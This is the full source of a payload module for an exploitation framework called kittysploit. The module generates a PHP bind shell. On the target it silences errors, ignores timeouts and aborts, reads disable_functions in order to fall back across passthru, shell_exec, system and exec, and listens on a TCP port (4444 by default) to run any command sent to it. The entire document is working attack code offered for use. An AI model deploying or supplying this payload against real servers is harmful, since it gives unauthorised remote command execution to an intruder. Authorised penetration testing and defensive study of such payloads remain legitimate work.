from kittysploit import *


class Module(Payload):

    CLIENT_LANGUAGE = "php"

    __info__ = {
        'name': 'PHP Command Shell, Bind TCP',
        'description': 'Listen on the target and expose a command shell via PHP',
        'category': PayloadCategory.SINGLE,
        'arch': Arch.PHP,
        'platform': Platform.ALL,
        'listener': 'listeners/multi/bind_tcp',
        'handler': Handler.BIND,
        'session_type': SessionType.PHP
    }

    rhost = OptString('0.0.0.0', 'Address to bind on the target', True)
    rport = OptPort(4444, 'Port to bind on the target', True)
    encoder = OptString('', 'Encoder', False, True)

    def generate(self):
        php_code = f"""
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
$dis=@ini_get('disable_functions');
if(!empty($dis)){{
  $dis=preg_replace('/[, ]+/', ',', $dis);
  $dis=explode(',', $dis);
  $dis=array_map('trim', $dis);
}}else{{
  $dis=array();
}}
function exec_cmd($c){{
  global $dis;
  $is_call='is_callable';
  $in_arr='in_array';
  if($is_call('passthru')&&!$in_arr('passthru',$dis)){{
    ob_start(); passthru($c.' 2>&1'); $o=ob_get_contents(); ob_end_clean();
  }}elseif($is_call('shell_exec')&&!$in_arr('shell_exec',$dis)){{
    $o=shell_exec($c.' 2>&1');
  }}elseif($is_call('system')&&!$in_arr('system',$dis)){{
    ob_start(); system($c.' 2>&1'); $o=ob_get_contents(); ob_end_clean();
  }}elseif($is_call('exec')&&!$in_arr('exec',$dis)){{
    $o=array(); exec($c.' 2>&1',$o); $o=join(chr(10),$o).chr(10);
  }}else{{
    $o=false;
  }}
  return $o;
}}
$addr='{self.rhost}';
$port={self.rport};
$server=@stream_socket_server('tcp://'.$addr.':'.$port,$errno,$errstr);
if($server){{
  $s=@stream_socket_accept($server,-1);
  if($s){{
    fwrite($s,'php> ');
    while(!feof($s)){{
      $c=fgets($s,2048);
      if($c===false){{break;}}
      $cmd=trim($c);
      if($cmd==='exit'||$cmd==='quit'){{break;}}
      if(substr($cmd,0,3)==='cd '){{
        @chdir(substr($cmd,3));
        $out='';
      }}else{{
        $out=exec_cmd($cmd);
        if($out===false){{$out='no exec functions'.chr(10);}}
      }}
      fwrite($s,$out.'php> ');
    }}
    fclose($s);
  }}
  fclose($server);
}}
"""
        return php_code.replace('\n', '').replace('  ', ' ').strip()
